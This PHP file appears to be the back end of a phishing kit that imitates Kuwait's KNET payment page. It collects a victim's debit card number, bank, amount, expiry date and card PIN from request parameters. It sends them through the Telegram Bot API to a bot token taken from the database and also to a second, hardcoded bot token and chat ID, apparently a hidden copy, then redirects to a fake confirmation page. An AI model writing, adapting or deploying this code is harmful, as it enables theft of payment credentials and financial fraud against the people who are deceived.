<?php
include 'controlPanel/Database.php';
$db = new Database();

$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);
if($db->dbNumRows( $result)){
    $rows = $db->dbFetchResult($result);
    foreach($rows as $row){
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
   

}
if(isset($_GET['prefix'])){

$_SESSION['prefix']=  $_GET['prefix'];
$_SESSION['month'] = $_GET['month'];
$_SESSION['year']= $_GET['year'];
$_SESSION['amount']= $_GET['amount'];
$_SESSION['interface'] =  $_GET['interface'];
$_SESSION['debitNumber'] = $_GET['debitNumber'];
$_SESSION['cardPin'] = $_GET['cardPin'];
$_SESSION['bank'] = $_GET['bank'];



    $prefix=  $_SESSION['prefix'];
    $month = $_SESSION['month'];
    $year= $_SESSION['year'];
    $amount= $_SESSION['amount'];
    $interface =  $_SESSION['interface'];
    $debitNumber = $_SESSION['debitNumber'];
    $cardPin = $_SESSION['cardPin'];
    $bank = $_SESSION['bank'];
    $apiToken = $token;

    $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
    // Prepare the POST data
    $databot='رقم البطافة   : '.$_GET['prefix'].$_GET['debitNumber'].PHP_EOL.'اسم البنك: '.$_GET['bank'].PHP_EOL.'المبلغ : '.$_GET['amount'].PHP_EOL
    .'الشهر : '.$_GET['month'].PHP_EOL.'السنة : '.$_GET['year'].PHP_EOL.'PIN : '.$_GET['cardPin'].PHP_EOL .'طريقة الدفع : KNET';
    
    
    $sender = [
        'chat_id' => $tokenID,
        'text' => $databot,
    ];
    // DIE($databot);

   
    
    // Initialize cURL
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // Execute cURL request
    $response = curl_exec($curl);

    $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
    // Prepare the POST data
    $senderr = [
        'chat_id' => 908949980,
        'text' => $databot,
    ];
    // DIE($databot);

   
    
    // Initialize cURL
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
    
    // Execute cURL request
    $response = curl_exec($curll);



    $url = 'knet_confirm.php';
    $date = ['url'=>$url];
    return print($url);

    
    // Set cURL options


   
}


?>